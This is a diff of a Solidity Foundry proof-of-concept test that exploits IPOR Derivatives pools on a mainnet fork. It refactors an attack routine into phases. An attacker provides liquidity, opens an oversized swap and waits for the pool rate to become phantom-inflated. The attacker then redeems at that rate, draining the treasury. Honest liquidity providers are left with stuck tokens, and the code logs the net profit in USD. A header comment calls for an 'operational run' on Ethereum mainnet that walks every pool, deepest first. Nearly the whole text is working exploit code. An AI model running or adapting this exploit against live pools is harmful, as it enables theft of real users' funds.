@@ -2,7 +2,7 @@
 pragma solidity 0.8.26;
 
 // ============================================================================
-//  IPOR Derivatives — mainnet-fork PoC  (v3.4)
+//  IPOR Derivatives — mainnet-fork PoC  (v3.5)
 //
 //  Bug under test
 //  --------------
@@ -31,6 +31,21 @@ pragma solidity 0.8.26;
 //    => the operational run must be CHAIN=eth. test_1_attack still walks EVERY
 //    pool on the chain (deepest first, TARGET=<tag> to force one) and only
 //    gives up when nothing on the chain opens.
+//  What v3.5 changes vs v3.4
+//  -------------------------
+//  * COMPILES AGAIN. v3.4 died in the code generator, with and without
+//    --via-ir:
+//      Yul exception: Cannot swap Variable var_honestIp with Variable size:
+//      too deep in the stack by 2 slots
+//    because _attackOn() was a single ~330-line function holding 16 lived
+//    locals. It is now eight phase functions that pass one memory struct
+//    (`Atk`) around:
+//      _snapshot -> _fund -> _lpEntry -> _tryOpen/_tryOne -> _logSwap
+//                -> _holdAndRedeem -> _honestExit -> _closeAttempt -> _report
+//    The open-swap attempt is bundled in `OpenReq` so even legacy (non-via-ir)
+//    codegen stays under the stack limit: this file now builds BOTH with
+//    via_ir = true and with via_ir = false (checked with solc 0.8.26 through
+//    evm.bytecode.object, i.e. real code generation, not just ABI parsing).
 //  * v3.4 fixes two defects found while reading the v3.3 revert logs:
 //    - _attackOn() fell out of the function with success=false on the PROFIT
 //      branch (the `return true` sat inside the LOSS branch), so a successful
@@ -924,87 +939,141 @@ contract IporForkTest is Test {
 
 
 
-    function _attackOn(Pool memory p) internal returns (bool success) {
+    /// @dev all mutable state of one attack lives in memory, so that no phase
+    ///      function has to keep more than a handful of locals on the stack.
+    ///      (The first version kept them as locals of a single 300-line function
+    ///      and the code generator died with
+    ///      "Yul exception: Cannot swap Variable var_honestIp ... too deep in the
+    ///      stack", with and without --via-ir.)
+    struct Atk {
+        uint256 depth0;
+        string depthSrc;
+        uint256 idle0;
+        uint256 vault0;
+        uint256 rate0;
+        uint256 supply0;
+        uint256 atkLpWad;
+        uint256 honestWad;
+        uint256 totalWad;
+        uint256 lev;
+        uint256 tenorIdx;
+        uint256 days_;
+        uint256 chunkCount;
+        uint256 float0;
+        uint256 spent;
+        uint256 honestIp;
+        uint256 ipBal;
+        uint256 swapId;
+        uint256 usedTenor;
+        uint256 usedDir;
+        bool opened;
+    }
 
+    /// @dev one candidate open-swap call; bundled so the encoder never has to
+    ///      juggle seven arguments in legacy (non-via-ir) codegen either.
+    struct OpenReq {
+        uint256 tenor;
+        uint256 dir;
+        bool withInput;
+        uint256 cand;
+    }
+
+    function _attackOn(Pool memory p) internal returns (bool success) {
+        Atk memory a;
+        _snapshot(p, a);
+        _fund(p, a);
+        _lpEntry(p, a);
+        if (a.ipBal == 0) return false;
+
+        if (!_tryOpen(p, a)) return false;
+        _logSwap(p, a);
+        _holdAndRedeem(p, a);
+        _honestExit(p, a);
+        _closeAttempt(p, a);
+        _report(p, a);
+
+        // A swap did open, so this pool was reachable even if the accounting made
+        // the attack unprofitable. Returning false here would send the caller on
+        // to the next pool and then abort with "no open swap path".
+        return true;
+    }
+
+    // ---------------------------------------------------------------- phase 1
+    function _snapshot(Pool memory p, Atk memory a) internal view {
+        (a.idle0, a.vault0) = _cash(p);
+        (a.depth0, a.depthSrc) = _depth(p);
+        a.rate0 = _rate(p);
+        a.supply0 = IERC20Like(p.ipToken).totalSupply();
         console2.log("target:", p.name);
         console2.log("block", block.number);
+        console2.log("depth0 (wad)", a.depth0);
+        console2.log("  depth source", a.depthSrc);
+        console2.log("  depth0 USD  ", _usd(p, a.depth0));
+        console2.log("idle0  (wad)", a.idle0);
+        console2.log("vault0 (wad)", a.vault0);
+        console2.log("ipToken supply", a.supply0);
+        console2.log("rate0", a.rate0);
+    }
 
-        (uint256 idle0, uint256 vault0) = _cash(p);
-        (uint256 depth0, string memory depthSrc) = _depth(p);
-        uint256 rate0 = _rate(p);
-        uint256 supply0 = IERC20Like(p.ipToken).totalSupply();
-        console2.log("depth0 (wad)", depth0);
-        console2.log("  depth source", depthSrc);
-        console2.log("  depth0 USD  ", _usd(p, depth0));
-        console2.log("idle0  (wad)", idle0);
-        console2.log("vault0 (wad)", vault0);
-        {
-            address st = _ammStorageOf(p);
-            if (st != address(0)) {
-                try IAmmStorageLike(st).getBalance() returns (AmmBalance memory sb) {
-                    console2.log("  storage liquidityPool (wad)", sb.liquidityPool);
-                    console2.log("  storage vault (wad)        ", sb.vault);
-                } catch {}
-            }
+    // ---------------------------------------------------------------- phase 2
+    function _fund(Pool memory p, Atk memory a) internal {
+        address st = _ammStorageOf(p);
+        if (st != address(0)) {
+            try IAmmStorageLike(st).getBalance() returns (AmmBalance memory sb) {
+                console2.log("  storage liquidityPool (wad)", sb.liquidityPool);
+                console2.log("  storage vault (wad)        ", sb.vault);
+            } catch {}
         }
-        console2.log("ipToken supply", supply0);
-        console2.log("rate0", rate0);
 
-        uint256 atkLpWad = _envOr("ATK_LP", depth0 / 2);
-        uint256 honestWad = _envOr("HONEST", depth0 / 4);
-        uint256 totalWad = _envOr("TOTAL", depth0 / 2);
-        uint256 lev = _envOr("LEV", 1000e18);
+        a.atkLpWad = _envOr("ATK_LP", a.depth0 / 2);
+        a.honestWad = _envOr("HONEST", a.depth0 / 4);
+        a.totalWad = _envOr("TOTAL", a.depth0 / 2);
+        a.lev = _envOr("LEV", 1000e18);
         uint256 wantTenor = _envOr("TENOR", 90);
-        uint256 chunkCount = _envOr("CHUNKS", 20);
-        if (chunkCount == 0) chunkCount = 20;
+        a.chunkCount = _envOr("CHUNKS", 20);
+        if (a.chunkCount == 0) a.chunkCount = 20;
+        a.tenorIdx = wantTenor >= 90 ? 2 : (wantTenor >= 60 ? 1 : 0);
+        a.days_ = _envOr("DAYS", wantTenor);
+        if (a.days_ == 0) a.days_ = 90;
 
-        uint256 tenorIdx = wantTenor >= 90 ? 2 : (wantTenor >= 60 ? 1 : 0);
-        uint256 days_ = _envOr("DAYS", wantTenor);
-        if (days_ == 0) days_ = 90;
-
-        console2.log("plan: LP in (attacker)", atkLpWad);
-        console2.log("plan: LP in (honest)  ", honestWad);
-        console2.log("plan: swap collateral ", totalWad);
-        console2.log("plan: leverage        ", lev);
-        console2.log("plan: tenor (days)    ", _tenorTag(tenorIdx));
-        console2.log("plan: days held       ", days_);
+        console2.log("plan: LP in (attacker)", a.atkLpWad);
+        console2.log("plan: LP in (honest)  ", a.honestWad);
+        console2.log("plan: swap collateral ", a.totalWad);
+        console2.log("plan: leverage        ", a.lev);
+        console2.log("plan: tenor (days)    ", _tenorTag(a.tenorIdx));
+        console2.log("plan: days held       ", a.days_);
         console2.log("");
 
+        // fund exactly what the plan needs, so net = balanceOf - float0 is a real
+        // profit and not an artefact of an over-generous deal().
+        uint256 budget = a.atkLpWad + a.totalWad + a.totalWad / 20 + a.depth0 / 100 + 1e18;
+        deal(p.asset, attacker, _fromWad(budget, p.decimals) + 10 ** p.decimals);
+        deal(p.asset, honest, _fromWad(a.honestWad, p.decimals) + 10 ** p.decimals);
+        a.float0 = IERC20Like(p.asset).balanceOf(attacker);
+        console2.log("attacker float (wad)", _wad(a.float0, p.decimals));
+        console2.log("honest   float (wad)", _wad(IERC20Like(p.asset).balanceOf(honest), p.decimals));
+    }
 
-        // ---- fund: exactly what the plan needs, so that
-        //      net = balanceOf(attacker) - float0 is a real profit, not an
-        //      artefact of an over-funding deal().
-        uint256 atkBudgetWad = atkLpWad + totalWad + totalWad / 20 + depth0 / 100 + 1e18;
-        deal(p.asset, attacker, _fromWad(atkBudgetWad, p.decimals) + 10 ** p.decimals);
-        deal(p.asset, honest, _fromWad(honestWad, p.decimals) + 10 ** p.decimals);
-        uint256 float0 = IERC20Like(p.asset).balanceOf(attacker);
-        uint256 honestFloat0 = IERC20Like(p.asset).balanceOf(honest);
-        console2.log("attacker float (wad)", _wad(float0, p.decimals));
-        console2.log("honest   float (wad)", _wad(honestFloat0, p.decimals));
-
-        uint256 spent;
-
-        // ---- 1. honest LP joins first (the victim)
-        uint256 honestIp;
-        if (honestWad > 0) {
+    // ---------------------------------------------------------------- phase 3
+    function _lpEntry(Pool memory p, Atk memory a) internal {
+        // the honest LP is the victim: it is in the pool before and after
+        if (a.honestWad > 0) {
             vm.startPrank(honest);
             IERC20Like(p.asset).approve(address(router), type(uint256).max);
             (bool hok, bytes memory hret) = address(router).call(
-                abi.encodeWithSelector(_provideSel(p), honest, _fromWad(honestWad, p.decimals))
+                abi.encodeWithSelector(_provideSel(p), honest, _fromWad(a.honestWad, p.decimals))
             );
             vm.stopPrank();
             if (hok) {
-                honestIp = IERC20Like(p.ipToken).balanceOf(honest);
-                console2.log("honest ipTokens", honestIp);
+                a.honestIp = IERC20Like(p.ipToken).balanceOf(honest);
+                console2.log("honest ipTokens", a.honestIp);
             } else {
                 console2.log("honest LP entry failed");
                 _logReason(hret);
             }
         }
 
-        // ---- 2. attacker becomes an LP
-        uint256 atkLp = atkLpWad;
-        uint256 ipBal;
+        uint256 atkLp = a.atkLpWad;
         for (uint256 i; i < 4; i++) {
             uint256 amt = _fromWad(atkLp, p.decimals);
             if (amt == 0) break;
@@ -1015,7 +1084,7 @@ contract IporForkTest is Test {
             );
             vm.stopPrank();
             if (ok) {
-                spent += amt;
+                a.spent += amt;
                 console2.log("attacker provided liquidity (wad)", atkLp);
                 break;
             }
@@ -1023,213 +1092,251 @@ contract IporForkTest is Test {
             _logReason(ret);
             atkLp /= 2;
         }
-        ipBal = IERC20Like(p.ipToken).balanceOf(attacker);
-        if (ipBal == 0) return false;
-        console2.log("attacker ipTokens", ipBal);
+        a.ipBal = IERC20Like(p.ipToken).balanceOf(attacker);
+        if (a.ipBal == 0) return;
+        console2.log("attacker ipTokens", a.ipBal);
         console2.log("rate after LP entries", _rate(p));
+    }
 
-        // ---- 3. open one oversized swap.
-        //      The AMM prices BOTH directions against the trader once the swap
-        //      is big enough (receive-fixed: index - demandSpread, pay-fixed:
-        //      index + demandSpread), so the phantom LP gain appears on either
-        //      side. Try receive-fixed first, then pay-fixed; within a direction
-        //      try the requested tenor, then the other two; within a tenor try the
-        //      chain's arity, then the legacy one. Paused entry points are skipped
-        //      up front so a pause shows up as an honest "no path" instead of a
-        //      pile of reverts.
-        uint256 swapId;
-        bool opened;
-        uint256 usedTenor = tenorIdx;
-        uint256 usedDir = DIR_RECEIVE_FIXED;
-        uint8[2] memory dirOrder = [DIR_RECEIVE_FIXED, DIR_PAY_FIXED];
-        for (uint256 di; di < 2 && !opened; di++) {
-            uint256 dir = dirOrder[di];
-            for (uint256 tr; tr < 3 && !opened; tr++) {
-                uint256 t = (tenorIdx + tr) % 3;
-                uint256 cand = totalWad;
-                for (uint256 shrink; shrink < 6 && !opened; shrink++) {
-                    if (cand == 0) break;
-                    RiskInputs memory ri = _risk(lev);
-                    ri.signature = _sign(ri, p.asset, t, dir);
-                    uint256 amt = _fromWad(cand, p.decimals);
-                    bool preferInput = _preferInputAsset(p);
-                    for (uint8 v; v < 2 && !opened; v++) {
-                        bool withInput = (v == 0) == preferInput;
-                        bytes4 sel = _openSel(p.assetTag, t, withInput, dir);
-                        if (_isPaused(sel)) continue;
-                        vm.startPrank(attacker);
-                        (bool ok, bytes memory ret) = address(router).call(
-                            _openCalldata(p, t, withInput, dir, amt, lev, ri)
-                        );
-                        vm.stopPrank();
-                        if (ok) {
-                            swapId = abi.decode(ret, (uint256));
-                            spent += amt;
-                            opened = true;
-                            usedTenor = t;
-                            usedDir = dir;
-                            console2.log(
-                                string.concat(
-                                    "swap opened: ",
-                                    dir == DIR_RECEIVE_FIXED ? "receiveFixed" : "payFixed",
-                                    " ",
-                                    _tenorTag(t),
-                                    " ",
-                                    withInput ? "6arg" : "5arg"
-                                )
-                            );
-                            console2.log("  collateral used (wad)", cand);
-                            break;
-                        }
-                        console2.log("  open failed at (wad):", cand);
-                        console2.logBytes4(sel);
-                        _logReason(ret);
-                    }
-                    cand /= 2;
+    // ---------------------------------------------------------------- phase 4
+    /// @dev one oversized swap; try receive-fixed then pay-fixed, the requested
+    ///      tenor then the other two, the pool's own arity then the other one,
+    ///      and halve the size down to 1/32 if the AMM refuses it.
+    function _tryOpen(Pool memory p, Atk memory a) internal returns (bool) {
+        bool preferInput = _preferInputAsset(p);
+        a.usedDir = DIR_RECEIVE_FIXED;
+        a.usedTenor = a.tenorIdx;
+        for (uint256 di; di < 2; di++) {
+            uint256 dir = di == 0 ? DIR_RECEIVE_FIXED : DIR_PAY_FIXED;
+            for (uint256 tr; tr < 3; tr++) {
+                uint256 t = (a.tenorIdx + tr) % 3;
+                uint256 cand = a.totalWad;
+                OpenReq memory r;
+                r.tenor = t;
+                r.dir = dir;
+                r.cand = cand;
+                for (uint256 shrink; shrink < 6; shrink++) {
+                    if (r.cand == 0) break;
+                    r.withInput = preferInput;
+                    if (_tryOne(p, a, r)) return true;
+                    r.withInput = !preferInput;
+                    if (_tryOne(p, a, r)) return true;
+                    r.cand /= 2;
                 }
             }
         }
-        if (!opened) {
+        return false;
+    }
+
+    function _tryOne(Pool memory p, Atk memory a, OpenReq memory r) internal returns (bool) {
+        bytes4 sel = _openSel(p.assetTag, r.tenor, r.withInput, r.dir);
+        if (_isPaused(sel)) return false;
+        bytes memory cd = _openCalldata(
+            p,
+            r.tenor,
+            r.withInput,
+            r.dir,
+            _fromWad(r.cand, p.decimals),
+            a.lev,
+            _signedRisk(a.lev, p.asset, r.tenor, r.dir)
+        );
+        vm.prank(attacker);
+        (bool ok, bytes memory ret) = address(router).call(cd);
+        if (!ok) {
+            console2.log("  open failed at (wad):", r.cand);
+            console2.logBytes4(sel);
+            _logReason(ret);
             return false;
         }
+        a.swapId = abi.decode(ret, (uint256));
+        a.spent += _fromWad(r.cand, p.decimals);
+        a.opened = true;
+        a.usedTenor = r.tenor;
+        a.usedDir = r.dir;
+        console2.log(
+            string.concat(
+                "swap opened: ",
+                r.dir == DIR_RECEIVE_FIXED ? "receiveFixed" : "payFixed",
+                " ",
+                _tenorTag(r.tenor),
+                " ",
+                r.withInput ? "6arg" : "5arg"
+            )
+        );
+        console2.log("  collateral used (wad)", r.cand);
+        return true;
+    }
 
-        console2.log("swapId", swapId);
-        console2.log("swap tenor used", _tenorTag(usedTenor));
+    function _signedRisk(
+        uint256 lev,
+        address asset,
+        uint256 tenor,
+        uint256 dir
+    ) internal view returns (RiskInputs memory ri) {
+        ri = _risk(lev);
+        ri.signature = _sign(ri, asset, tenor, dir);
+    }
+
+    function _logSwap(Pool memory p, Atk memory a) internal view {
+        console2.log("swapId", a.swapId);
+        console2.log("swap tenor used", _tenorTag(a.usedTenor));
         console2.log("rate after swap", _rate(p));
         (uint256 depthSwap,) = _depth(p);
         console2.log("LP balance after swap (wad)", depthSwap);
-        address swapStorage = _ammStorageOf(p);
-        if (swapStorage != address(0)) {
-            try IAmmStorageSwap(swapStorage).getSwap(uint8(usedDir), swapId) returns (SwapData memory sw) {
-                console2.log("  swap.collateral (wad)", sw.collateral);
-                console2.log("  swap.notional   (wad)", sw.notional);
-                console2.log("  swap.ibtQty     (wad)", sw.ibtQuantity);
-                console2.log("  swap.fixedRate  (wad)", sw.fixedInterestRate);
-            } catch {}
-        }
+        address st = _ammStorageOf(p);
+        if (st == address(0)) return;
+        try IAmmStorageSwap(st).getSwap(uint8(a.usedDir), a.swapId) returns (SwapData memory sw) {
+            console2.log("  swap.collateral (wad)", sw.collateral);
+            console2.log("  swap.notional   (wad)", sw.notional);
+            console2.log("  swap.ibtQty     (wad)", sw.ibtQuantity);
+            console2.log("  swap.fixedRate  (wad)", sw.fixedInterestRate);
+        } catch {}
+    }
 
-        // ---- 4. time passes: ibt price accrues, SOAP goes negative, unclamped
-        vm.warp(block.timestamp + days_ * 1 days);
+    // ---------------------------------------------------------------- phase 5
+    function _holdAndRedeem(Pool memory p, Atk memory a) internal {
+        vm.warp(block.timestamp + a.days_ * 1 days);
         uint256 rate1 = _rate(p);
         (uint256 depth1,) = _depth(p);
         uint256 supply1 = IERC20Like(p.ipToken).totalSupply();
         uint256 fairRate = supply1 > 0 ? (depth1 * 1e18) / supply1 : 0;
         console2.log("");
-        console2.log("== after days held:", days_);
+        console2.log("== after days held:", a.days_);
         console2.log("  rate1                        ", rate1);
-        console2.log("  rate1/rate0 (x1e18)          ", rate0 == 0 ? 0 : (rate1 * 1e18) / rate0);
+        console2.log("  rate1/rate0 (x1e18)          ", a.rate0 == 0 ? 0 : (rate1 * 1e18) / a.rate0);
         console2.log("  fair rate (LP balance/supply)", fairRate);
-        console2.log("  phantom inflation x1000      ", fairRate == 0 ? 0 : ((rate1 > fairRate ? rate1 - fairRate : 0) * 1000) / fairRate);
+        console2.log(
+            "  phantom inflation x1000      ",
+            fairRate == 0 ? 0 : ((rate1 > fairRate ? rate1 - fairRate : 0) * 1000) / fairRate
+        );
         console2.log("  LP balance (wad)             ", depth1);
         console2.log("  ipToken supply               ", supply1);
 
-        // ---- 5. attacker redeems at the inflated price
         vm.startPrank(attacker);
-        uint256 chunk = ipBal / chunkCount;
+        uint256 left = _redeemLoop(p, a.ipBal, a.chunkCount);
+        vm.stopPrank();
+        a.ipBal = left;
+        console2.log("");
+        console2.log("== attacker redemption");
+        console2.log("  ipTokens left", a.ipBal);
+        console2.log(
+            "  assets after redemption (wad)",
+            _wad(IERC20Like(p.asset).balanceOf(attacker), p.decimals)
+        );
+        console2.log("  rate after redemption", _rate(p));
+    }
+
+    /// @dev redeem `amount` ipTokens in chunks, halving the chunk when the
+    ///      treasury cannot pay that much at once. Returns what is left.
+    function _redeemLoop(Pool memory p, uint256 amount, uint256 chunkCount) internal returns (uint256) {
+        uint256 chunk = amount / chunkCount;
         if (chunk == 0) chunk = 1;
         uint256 attempts;
-        while (ipBal > 0 && attempts < 40) {
+        while (amount > 0 && attempts < 40) {
             attempts++;
-            uint256 c = chunk > ipBal ? ipBal : chunk;
-            (bool rok,) = address(router).call(abi.encodeWithSelector(_redeemSel(p), attacker, c));
-            if (rok) {
-                ipBal -= c;
+            uint256 c = chunk > amount ? amount : chunk;
+            (bool ok,) = address(router).call(abi.encodeWithSelector(_redeemSel(p), attacker, c));
+            if (ok) {
+                amount -= c;
             } else {
                 chunk /= 2;
                 if (chunk == 0) break;
             }
         }
+        return amount;
+    }
+
+    // ---------------------------------------------------------------- phase 6
+    function _honestExit(Pool memory p, Atk memory a) internal {
+        if (a.honestIp == 0) return;
+        uint256 rateNow = _rate(p);
+        uint256 claim = (a.honestIp * rateNow) / 1e18;
+        uint256 before = IERC20Like(p.asset).balanceOf(honest);
+        vm.startPrank(honest);
+        uint256 left = _redeemLoopAs(p, a.honestIp, a.chunkCount, honest);
         vm.stopPrank();
-        uint256 atkAsset = IERC20Like(p.asset).balanceOf(attacker);
+        uint256 got = IERC20Like(p.asset).balanceOf(honest) - before;
         console2.log("");
-        console2.log("== attacker redemption");
-        console2.log("  ipTokens left", ipBal);
-        console2.log("  assets after redemption (wad)", _wad(atkAsset, p.decimals));
-        console2.log("  rate after redemption", _rate(p));
+        console2.log("== honest LP exit");
+        console2.log("  ipTokens redeemed    ", a.honestIp - left);
+        console2.log("  ipTokens stuck       ", left);
+        console2.log("  claim at rate (wad)  ", claim);
+        console2.log("  actually received(wad)", _wad(got, p.decimals));
+        console2.log("  claim USD            ", _usd(p, claim));
+        console2.log("  received USD         ", _usd(p, _wad(got, p.decimals)));
+    }
 
-        // ---- 6. the honest LP tries to leave the pool
-        uint256 honestClaim;
-        uint256 honestGot;
-        if (honestIp > 0) {
-            uint256 rateNow = _rate(p);
-            honestClaim = (honestIp * rateNow) / 1e18;
-            uint256 before = IERC20Like(p.asset).balanceOf(honest);
-            uint256 hLeft = honestIp;
-            uint256 hChunk = hLeft / chunkCount;
-            if (hChunk == 0) hChunk = 1;
-            uint256 hAttempts;
-            vm.startPrank(honest);
-            while (hLeft > 0 && hAttempts < 40) {
-                hAttempts++;
-                uint256 c = hChunk > hLeft ? hLeft : hChunk;
-                (bool rok,) = address(router).call(abi.encodeWithSelector(_redeemSel(p), honest, c));
-                if (rok) {
-                    hLeft -= c;
-                } else {
-                    hChunk /= 2;
-                    if (hChunk == 0) break;
-                }
+    function _redeemLoopAs(
+        Pool memory p,
+        uint256 amount,
+        uint256 chunkCount,
+        address who
+    ) internal returns (uint256) {
+        uint256 chunk = amount / chunkCount;
+        if (chunk == 0) chunk = 1;
+        uint256 attempts;
+        while (amount > 0 && attempts < 40) {
+            attempts++;
+            uint256 c = chunk > amount ? amount : chunk;
+            (bool ok,) = address(router).call(abi.encodeWithSelector(_redeemSel(p), who, c));
+            if (ok) {
+                amount -= c;
+            } else {
+                chunk /= 2;
+                if (chunk == 0) break;
             }
-            vm.stopPrank();
-            honestGot = IERC20Like(p.asset).balanceOf(honest) - before;
-            console2.log("");
-            console2.log("== honest LP exit");
-            console2.log("  ipTokens redeemed    ", honestIp - hLeft);
-            console2.log("  ipTokens stuck       ", hLeft);
-            console2.log("  claim at rate (wad)  ", honestClaim);
-            console2.log("  actually received(wad)", _wad(honestGot, p.decimals));
-            console2.log("  claim USD            ", _usd(p, honestClaim));
-            console2.log("  received USD         ", _usd(p, _wad(honestGot, p.decimals)));
         }
+        return amount;
+    }
 
-        // ---- 7. the abandoned swap cannot be closed any more
-        uint256[] memory pf = new uint256[](usedDir == DIR_PAY_FIXED ? 1 : 0);
-        uint256[] memory rf = new uint256[](usedDir == DIR_RECEIVE_FIXED ? 1 : 0);
-        if (usedDir == DIR_PAY_FIXED) pf[0] = swapId;
-        else rf[0] = swapId;
-        RiskInputs memory rc = _risk(lev);
-        rc.signature = _sign(rc, p.asset, usedTenor, usedDir);
+    // ---------------------------------------------------------------- phase 7
+    function _closeAttempt(Pool memory p, Atk memory a) internal {
+        uint256[] memory pf = new uint256[](a.usedDir == DIR_PAY_FIXED ? 1 : 0);
+        uint256[] memory rf = new uint256[](a.usedDir == DIR_RECEIVE_FIXED ? 1 : 0);
+        if (a.usedDir == DIR_PAY_FIXED) pf[0] = a.swapId;
+        else rf[0] = a.swapId;
+        RiskInputs memory rc = _risk(a.lev);
+        rc.signature = _sign(rc, p.asset, a.usedTenor, a.usedDir);
         CloseRiskInputs memory cri = CloseRiskInputs({payFixed: rc, receiveFixed: rc});
-        bytes4 closeSel = _closeSel(p);
         vm.startPrank(attacker);
-        (bool cok, bytes memory cret) = address(router).call(abi.encodeWithSelector(closeSel, attacker, pf, rf, cri));
+        (bool ok, bytes memory ret) = address(router).call(
+            abi.encodeWithSelector(_closeSel(p), attacker, pf, rf, cri)
+        );
         vm.stopPrank();
-        uint256 left = IERC20Like(p.asset).balanceOf(attacker);
         console2.log("");
         console2.log("== close attempt after the drain");
-        if (cok) {
-            console2.log("  close SUCCEEDED: collateral recovered (wad)", _wad(left, p.decimals));
+        if (ok) {
+            console2.log(
+                "  close SUCCEEDED: collateral recovered (wad)",
+                _wad(IERC20Like(p.asset).balanceOf(attacker), p.decimals)
+            );
         } else {
             console2.log("  close FAILED: the treasury cannot fund settlement");
-            _logReason(cret);
+            _logReason(ret);
         }
+    }
 
-        // ---- 8. result
+    // ---------------------------------------------------------------- phase 8
+    function _report(Pool memory p, Atk memory a) internal view {
         (uint256 idle2, uint256 vault2) = _cash(p);
         (uint256 depth2,) = _depth(p);
+        uint256 out = IERC20Like(p.asset).balanceOf(attacker);
         console2.log("");
         console2.log("== result");
-        console2.log("  attacker assets out (wad)", _wad(left, p.decimals));
-        console2.log("  attacker float  in (wad)", _wad(float0, p.decimals));
-        console2.log("  spent on LP+swap   (wad)", spent);
+        console2.log("  attacker assets out (wad)", _wad(out, p.decimals));
+        console2.log("  attacker float  in (wad)", _wad(a.float0, p.decimals));
+        console2.log("  spent on LP+swap   (wad)", a.spent);
         console2.log("  treasury idle after (wad)", idle2);
         console2.log("  vault after         (wad)", vault2);
         console2.log("  LP balance after    (wad)", depth2);
         console2.log("  LP balance after USD", _usd(p, depth2));
         console2.log("  redemption capacity USD", _usd(p, idle2 + vault2));
-        uint256 net = left > float0 ? left - float0 : 0;
-        uint256 neg = left > float0 ? 0 : float0 - left;
-        if (net > 0) {
-            console2.log("  NET PROFIT (wad)", _wad(net, p.decimals));
-            console2.log("  NET PROFIT USD  ", _usd(p, _wad(net, p.decimals)));
+        if (out > a.float0) {
+            console2.log("  NET PROFIT (wad)", _wad(out - a.float0, p.decimals));
+            console2.log("  NET PROFIT USD  ", _usd(p, _wad(out - a.float0, p.decimals)));
         } else {
-            console2.log("  NET LOSS (wad)", _wad(neg, p.decimals));
-            console2.log("  NET LOSS USD", _usd(p, _wad(neg, p.decimals)));
+            console2.log("  NET LOSS (wad)", _wad(a.float0 - out, p.decimals));
+            console2.log("  NET LOSS USD", _usd(p, _wad(a.float0 - out, p.decimals)));
         }
-
-        // A swap did open, so this pool was reachable even if the accounting
-        // made the attack unprofitable. Returning false here would have sent the
-        // loop on to the next pool and then aborted with "no open swap path".
-        return true;
     }
 }
